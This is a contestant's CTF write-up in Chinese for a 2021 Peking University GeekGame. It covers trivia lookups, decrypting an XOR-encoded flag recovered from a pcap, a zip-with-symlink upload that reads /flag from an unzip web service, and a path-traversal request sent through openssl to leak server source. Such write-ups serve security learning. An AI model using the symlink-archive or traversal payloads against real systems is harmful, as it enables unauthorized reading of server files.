完整昵称：宝硕|baoshuo.ren|石家庄二中

## 签到

下载下来题目以后看到了一些奇奇怪怪的字符：

![](https://vip2.loli.io/2021/11/13/B2KsfQbYaPSc9eH.png)

使用 Acrobat 编辑 PDF 文件，把里面的内容复制出来，然后再写个程序合并一下就行了：

```cpp
#include <bits/stdc++.h>

using namespace std;

int main() {
    string s1 = "fa{aeAGetTm@ekaev!";
    string s2 = "lgHv__ra_ieGeGm_1}";
    for (int i = 0; i < s1.size(); i++) {
        cout << s1[i] << s2[i];
    }
    cout << endl;
    return 0;
}
```

## 小北问答

1. 北京大学燕园校区有理科 1 号楼到理科 X 号楼，但没有理科 (X+1) 号及之后的楼。X 是？

![](https://vip2.loli.io/2021/11/13/ErFncKfpWg3jJSb.jpg)

上网搜到了一份地图。

2. 上一届（第零届）比赛的总注册人数有多少？

在 [北京大学举办首届信息安全综合能力竞赛 - 北京大学新闻网](https://news.pku.edu.cn/xwzh/203d197d93c245a1aec23626bb43d464.htm) 中可以找到相关信息。

3. geekgame.pku.edu.cn 的 HTTPS 证书曾有一次忘记续期了，发生过期的时间是？

在 crt.sh 上可以搜到这张 [过期了的证书](https://crt.sh/?id=4362003382) 。

4. 2020 年 DEFCON CTF 资格赛签到题的 flag 是？

找到了存档：https://archive.ooo/c/welcome-to-dc2020-quals/358/

下载附件即可找到答案。

5. 在大小为 672328094 \* 386900246 的方形棋盘上放 3 枚（相同的）皇后且它们互不攻击，有几种方法？

容斥一下：

$$
  \begin{aligned}
    \text{ans} = ~ & \binom{n \times m}{3} \\
    - ~ & \binom{n}{2} \times m \times n \times m - \binom{m}{2} \times n \times n \times m \\
    - ~ & 2 \times n \times m \times \sum_{i = 2}^{\min(n, m) - 1}{\binom{i}{2}} \\
    - ~ & (\max(n, m) - \min(n, m)) \times \binom{\min(n, m)}{2} \times n \times m \\
    + ~ & 3 \times ( \\
      & \qquad \binom{n}{3} \times m + \binom{m}{3} \times n \\
      & \quad + \sum^{n}_{i = 1} \sum^{m}_{j = 1} ( \\
      & \quad \qquad \min(i - 1, j - 1) + \min(n - i - 1, j - 1) \\
      & \quad  \quad + \min(i - 1, m - j - 1) + \min(n - i - 1, m - j - 1) \\
      & \quad ) \\
      & )
  \end{aligned}
$$

写出了一份 Python 代码

```python
#!/usr/bin/env python3
# coding: utf-8

from math import comb

# n, m = map(int, input().split())
n = 672328094
m = 386900246

ans = comb(n * m, 3) \
    - comb(n, 2) * m * n * m \
    - comb(m, 2) * n * n * m \
    - 2 * n * m * [comb(i, 2) for i in range(2, min(n, m))] \
    - (max(n, m) - min(n, m)) * comb(min(n, m), 2) * n * m \
    + 3 * (
    comb(n, 3) * m
        + comb(m, 3) * n
        + [min(i - 1, j - 1) + min(n - i - 1, j - 1) + min(n - i - 1, m - j - 1) +
           min(i - 1, m - j - 1) for i in range(1, n + 1) for j in range(1, m + 1)]
)

print(ans)
```

然后并没有跑出来。尝试简化式子，但是失败了。

6. 上一届（第零届）比赛的「小北问答 1202」题目会把所有选手提交的答案存到 SQLite 数据库的一个表中，这个表名叫？

在 GitHub 上可以找到该题的源码，打开 [数据库部分](https://github.com/PKU-GeekGame/geekgame-0th/blob/05bcab4c0ec1e5347a377e255f6ccd70b4166bbb/src/choice/game/db.py#L12) 即可查看到表名。

7. 国际互联网由许多个自治系统（AS）组成。北京大学有一个自己的自治系统，它的编号是？

![](https://vip1.loli.io/2021/11/13/jEHXvyunIegVRKt.png)

在 [bgp.he.net](https://bgp.he.net) 上搜一搜就好了。

8. 截止到 2021 年 6 月 1 日，北京大学信息科学技术学院下属的中文名称最长的实验室叫？

在这个页面中可以找到：https://eecs.pku.edu.cn/info/1060/11528.htm

获得第一个 flag ：`flag{JIU-Cong-Xian-Zai-Kai-Shi}`

## 翻车的谜语人

打开题目下发的文件，一个 pcap 文件赫然在目。

使用 WireShark 打开文件，大致看了看，发现有 HTTP 流量，并且包含 flag 字符。

![](https://vip2.loli.io/2021/11/14/1yQDKRsIWPZ4j9O.png)

查看 HTTP 流信息可知 `flag1.txt` 的信息：

```json
{
  "name": "flag1.txt",
  "path": "flag1.txt",
  "last_modified": "2021-11-06T07:43:20.952991Z",
  "created": "2021-11-06T07:43:20.952991Z",
  "content": "788c3a1289cbe5383466f9184b07edac6a6b3b37f78e0f7ce79bece502d63091ef5b7087bc44",
  "format": "text",
  "mimetype": "text/plain",
  "size": 76,
  "writable": true,
  "type": "file"
}
```

然后寻找解密方法。

使用 WireShark 的「导出对象」功能将所有请求返回的数据都导出到了硬盘上，然后翻到了一个 Jupyter 文件：

```json
{
  "name": "Untitled.ipynb",
  "path": "Untitled.ipynb",
  "last_modified": "2021-11-06T07:43:22.084991Z",
  "created": "2021-11-06T07:43:22.084991Z",
  "content": {
    "cells": [
      {
        "cell_type": "code",
        "execution_count": 26,
        "metadata": {
          "trusted": true
        },
        "outputs": [],
        "source": "import zwsp_steg\nfrom Crypto.Random import get_random_bytes"
      },
      {
        "cell_type": "code",
        "execution_count": 27,
        "metadata": {
          "trusted": true
        },
        "outputs": [],
        "source": "import binascii"
      },
      {
        "cell_type": "code",
        "execution_count": 28,
        "metadata": {
          "trusted": true
        },
        "outputs": [],
        "source": "def genflag():\n    return 'flag{%s}'%binascii.hexlify(get_random_bytes(16)).decode()"
      },
      {
        "cell_type": "code",
        "execution_count": 29,
        "metadata": {
          "trusted": true
        },
        "outputs": [],
        "source": "flag1 = genflag()\nflag2 = genflag()"
      },
      {
        "cell_type": "code",
        "execution_count": 30,
        "metadata": {
          "trusted": true
        },
        "outputs": [],
        "source": "key = get_random_bytes(len(flag1))"
      },
      {
        "cell_type": "code",
        "execution_count": 31,
        "metadata": {
          "trusted": true
        },
        "outputs": [
          {
            "data": {
              "text/plain": "b'\\x1e\\xe0[u\\xf2\\xf2\\x81\\x01U_\\x9d!yc\\x8e\\xce[X\\r\\x04\\x94\\xbc9\\x1d\\xd7\\xf8\\xde\\xdcd\\xb2Q\\xa3\\x8a?\\x16\\xe5\\x8a9'"
            },
            "execution_count": 31,
            "metadata": {},
            "output_type": "execute_result"
          }
        ],
        "source": "key"
      },
      {
        "cell_type": "code",
        "execution_count": 32,
        "metadata": {
          "trusted": true
        },
        "outputs": [],
        "source": "def xor_each(k, b):\n    assert len(k)==len(b)\n    out = []\n    for i in range(len(b)):\n        out.append(b[i]^k[i])\n    return bytes(out)"
      },
      {
        "cell_type": "code",
        "execution_count": 33,
        "metadata": {
          "trusted": true
        },
        "outputs": [],
        "source": "encoded_flag1 = xor_each(key, flag1.encode())\nencoded_flag2 = xor_each(key, flag2.encode())"
      },
      {
        "cell_type": "code",
        "execution_count": 35,
        "metadata": {
          "trusted": true
        },
        "outputs": [],
        "source": "with open('flag1.txt', 'wb') as f:\n    f.write(binascii.hexlify(encoded_flag1))"
      },
      {
        "cell_type": "code",
        "execution_count": null,
        "metadata": {
          "trusted": true
        },
        "outputs": [],
        "source": ""
      }
    ],
    "metadata": {
      "kernelspec": {
        "display_name": "Python 3 (ipykernel)",
        "language": "python",
        "name": "python3"
      },
      "language_info": {
        "codemirror_mode": {
          "name": "ipython",
          "version": 3
        },
        "file_extension": ".py",
        "mimetype": "text/x-python",
        "name": "python",
        "nbconvert_exporter": "python",
        "pygments_lexer": "ipython3",
        "version": "3.8.3rc1"
      }
    },
    "nbformat": 4,
    "nbformat_minor": 4
  },
  "format": "json",
  "mimetype": null,
  "size": 2605,
  "writable": true,
  "type": "notebook"
}
```

转换成 python 代码就是这个样子：

```python
import zwsp_steg
from Crypto.Random import get_random_bytes
import binascii


def genflag():
    return 'flag{%s}' % binascii.hexlify(get_random_bytes(16)).decode()


flag1 = genflag()
flag2 = genflag()

key = get_random_bytes(len(flag1))

print(key)
# Output: b'\\x1e\\xe0[u\\xf2\\xf2\\x81\\x01U_\\x9d!yc\\x8e\\xce[X\\r\\x04\\x94\\xbc9\\x1d\\xd7\\xf8\\xde\\xdcd\\xb2Q\\xa3\\x8a?\\x16\\xe5\\x8a9'


def xor_each(k, b):
    assert len(k) == len(b)
    out = []
    for i in range(len(b)):
        out.append(b[i] ^ k[i])
    return bytes(out)


encoded_flag1 = xor_each(key, flag1.encode())
encoded_flag2 = xor_each(key, flag2.encode())

with open('flag1.txt', 'wb') as f:
    f.write(binascii.hexlify(encoded_flag1))
```

可以倒着写出一个程序来解密：

```python
import binascii

key = b'\x1e\xe0[u\xf2\xf2\x81\x01U_\x9d!yc\x8e\xce[X\r\x04\x94\xbc9\x1d\xd7\xf8\xde\xdcd\xb2Q\xa3\x8a?\x16\xe5\x8a9'

def xor_each(k, b):
    assert len(k) == len(b)
    out = []
    for i in range(len(b)):
        out.append(b[i] ^ k[i])
    return bytes(out)


encoded_flag1 = binascii.unhexlify('788c3a1289cbe5383466f9184b07edac6a6b3b37f78e0f7ce79bece502d63091ef5b7087bc44')

flag1 = xor_each(key, encoded_flag1)

print(flag1)
```

跑一遍就把 flag1 拿到手了：`flag{9d9a9d92dcb1363c26a0c29fda2edfb6}`。

## 在线解压网站

题目源码：

```python
import os
import json
from shutil import copyfile
from flask import Flask, request, render_template, url_for, send_from_directory, make_response, redirect
from werkzeug.middleware.proxy_fix import ProxyFix
from flask import jsonify
from hashlib import md5
import signal
from http.server import HTTPServer, SimpleHTTPRequestHandler

os.environ['TEMP'] = '/dev/shm'

app = Flask("access")
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1)


@app.route('/', methods=['POST', 'GET'])
def index():
    if request.method == 'POST':
        f = request.files['file']
        os.system("rm -rf /dev/shm/zip/media/*")
        path = os.path.join("/dev/shm/zip/media", 'tmp.zip')
        f.save(path)
        os.system(
            'timeout -k 1 3 unzip /dev/shm/zip/media/tmp.zip -d /dev/shm/zip/media/')
        os.system('rm /dev/shm/zip/media/tmp.zip')
        return redirect('/media/')
    response = render_template('index.html')
    return response


@app.route('/media', methods=['GET'])
@app.route('/media/', methods=['GET'])
@app.route('/media/<path>', methods=['GET'])
def media(path=""):
    npath = os.path.join("/dev/shm/zip/media", path)
    if not os.path.exists(npath):
        return make_response("404", 404)
    if not os.path.isdir(npath):
        f = open(npath, 'rb')
        response = make_response(f.read())
        response.headers['Content-Type'] = 'application/octet-stream'
        return response
    else:
        fn = os.listdir(npath)
        fn = [".."]+fn
        f = open("templates/template.html")
        x = f.read()
        f.close()
        ret = "<h1>文件列表:</h1><br><hr>"
        for i in fn:
            tpath = os.path.join('/media/', path, i)
            ret += "<a href='"+tpath+"'>"+i+"</a><br>"
        x = x.replace("HTMLTEXT", ret)
        return x


os.system('mkdir /dev/shm/zip')
os.system('mkdir /dev/shm/zip/media')

app.run(host="0.0.0.0", port=8080, debug=False, threaded=True)
```

众所周知，使用 unzip 解压时会保留软连接，那么只需要构造一个含软连接的压缩包即可。

```bash
ln -s /flag flag
zip -y flag.zip flag
```

为 zip 命令添加 `-y` 参数可以将将软链接按原样存储，也就是存储软链接而不是该软链接引用的文件。

然后 flag 就到手了：`flag{NeV3r_trUSt_any_C0mpResSed_File}` 。

## Flag 即服务

### 零·获得代码

最开始想到了构造请求逃逸出 data 目录，可惜刚开始不知道 curl 也会遵循 RFC 3986 ，于是搞了很久也没搞出来，中间试着用 netcat 构造，但 netcat 不支持 HTTPS ，以失败告终。

看到提示以后在网上查了查，使用 openssl 可以进行 HTTPS 请求，于是构造了一个这样的请求：

```http
GET /api/../package.json HTTP/1.1
Host: prob11-********.geekgame.pku.edu.cn
Cookie: ******
```

跑一下：

```bash
cat request.txt | openssl s_client -connect prob11-${hidden}.geekgame.pku.edu.cn:443 -ign_eof
```

![](https://vip2.loli.io/2021/11/18/T4yY2AiecPGSzHC.png)

下载下来压缩包以后，在 `index.js` 的末尾有这样一段：

```javascript
module.exports = function start_server(port) {
    if (FLAG0 !== `flag{${0.1 + 0.2}}`) return;
    FLAG2 = null;
    app.listen(port, () => {
        console.log(`server started on :${port}`);
    });
};
```

~~不懂你们 PKU 为什么要把具名函数和箭头函数混着用。~~

然后把 <code>\`flag{${0.1 + 0.2}}\`</code> 丢进 Node 里面跑一下就好了。 

![](https://vip1.loli.io/2021/11/18/CSvMBWO65DdjxpU.png)

每日 Awesome JavaScript (1/1) 。

